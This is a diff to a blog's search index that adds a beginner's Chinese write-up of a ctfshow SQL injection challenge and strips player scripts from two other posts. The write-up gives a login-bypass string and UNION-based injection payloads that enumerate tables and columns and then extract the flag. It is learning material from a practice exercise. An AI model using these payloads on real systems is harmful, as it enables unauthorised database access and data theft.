@@ -4,11 +4,30 @@
   
     
     <entry>
+      <title>ctfshow web2</title>
+      <link href="/2021/06/17/ctfshow-web2/"/>
+      <url>/2021/06/17/ctfshow-web2/</url>
+      
+        <content type="html"><![CDATA[<hr><p><em><strong>ctfshow web2 writeup</strong></em></p><p>这是本人第一次写blog，有不好的地方希望大家多多指出<br>从此开始踏上了网安的不归路，成为了一只web狗<br><img src="https://img-blog.csdnimg.cn/20201120113751678.jpg#pic_center" alt="在这里插入图片描述"></p><hr style=" border:solid; width:100px; height:1px;" color="#000000" size="1""><p><strong>从题目可以看出这是一道sql注入的题</strong><br><img src="https://img-blog.csdnimg.cn/20201120114615698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTg2NjM2Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><font color="#999AAA">示例：pandas 是基于NumPy 的一种工具，该工具是为了解决数据分析任务而创建的。</font></p><p><strong>首先我们尝试使用万能密码</strong><br>admin<br>‘or 1=1#</p><p><img src="https://img-blog.csdnimg.cn/20201120114633695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTg2NjM2Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>**<strong>这里可以发现我们已经登陆成功了</strong></p><p>接下来我们使用联合查询来查询回显位置**</p><p>1’ or 1=1 union select 1,2,3 #</p><p><img src="https://img-blog.csdnimg.cn/20201120115105342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTg2NjM2Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>爆表</strong></p><p>1’  or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</p><p><img src="https://img-blog.csdnimg.cn/2020112012005055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTg2NjM2Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>成功</strong></p><p><strong>再接再厉，接下来就是爆字段</strong></p><p>1’ or 1=1 union select 1, group_concat(column_name),3 from information_schema.columns where table_name=’flag’#</p><p><img src="https://img-blog.csdnimg.cn/20201120120702163.png#pic_center" alt="在这里插入图片描述"><br><strong>胜利就在眼前****，</strong>进行最后一步，取数据****</p><p>1’or 1=1 union select 1,flag,3 from flag#</p><p><img src="https://img-blog.csdnimg.cn/2020112012084654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTg2NjM2Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><strong><em>至此就已经完成了这道简单的sql注入题目</em>，成功拿到flag</strong></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>记录</title>
       <link href="/2021/06/15/%E8%AE%B0%E5%BD%95/"/>
       <url>/2021/06/15/%E8%AE%B0%E5%BD%95/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo-butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end"><a href="#建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo-butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end" class="headerlink" title="建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo+butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end"></a>建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo+butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end</h1>]]></content>
+        <content type="html"><![CDATA[<h1 id="建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo-butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end"><a href="#建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo-butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end" class="headerlink" title="建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo+butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end"></a>建这小破站废了少说有四天的时间，期间尝试了各种主题与框架，最后选择了hexo+butterfly的组合，next搞得我心态实在是有点崩，最后放弃。。。这一波下来确实学到了不少东西，或许就这样在web的路上越走越远吧。移动端适配的问题等我缓一缓再说，美化感觉也差不多，构建在github上在国内访问确实速度不够快，这也是没办法的事情。这就是新家了，到时候搞个脚本把CSDN上的博客都爬过来。end</h1>]]></content>
       
       
       
@@ -21,7 +40,7 @@
       <link href="/2021/06/15/typora/"/>
       <url>/2021/06/15/typora/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+        <content type="html"><![CDATA[]]></content>
       
       
       
